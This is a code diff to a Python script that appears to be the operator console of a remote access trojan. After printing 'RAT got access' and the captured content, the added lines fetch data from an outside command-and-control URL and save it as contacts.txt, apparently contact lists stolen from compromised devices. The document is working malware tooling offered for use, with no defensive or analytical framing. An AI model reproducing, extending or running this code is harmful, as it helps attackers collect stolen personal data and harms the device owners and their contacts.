@@ -21,7 +21,19 @@ while True:
                 os.system('clear')
                 print(f"{GREEN}RAT got access. Proceeding...{RESET}")
                 print(f"{GREEN}Content:\n {content} {RESET}")
-                input("Press Enter to exit.")
+                user_input = input("Download content? Y/N: ")
+                if user_input.strip().lower() == 'y':
+                    try:
+                        download_url = "http://bluntcord.medianewsonline.com/aroid_to/download.php"
+                        download_response = requests.get(download_url)
+                        if download_response.status_code == 200:
+                            with open(os.path.expanduser('~/Downloads/contacts.txt'), 'w') as file:
+                                file.write(download_response.text)
+                            print("File downloaded successfully to Downloads folder.")
+                        else:
+                            print(f"Failed to download file. Status code: {download_response.status_code}")
+                    except Exception as e:
+                        print(f"Error during download: {e}")
                 break
             else:
                 os.system('clear')
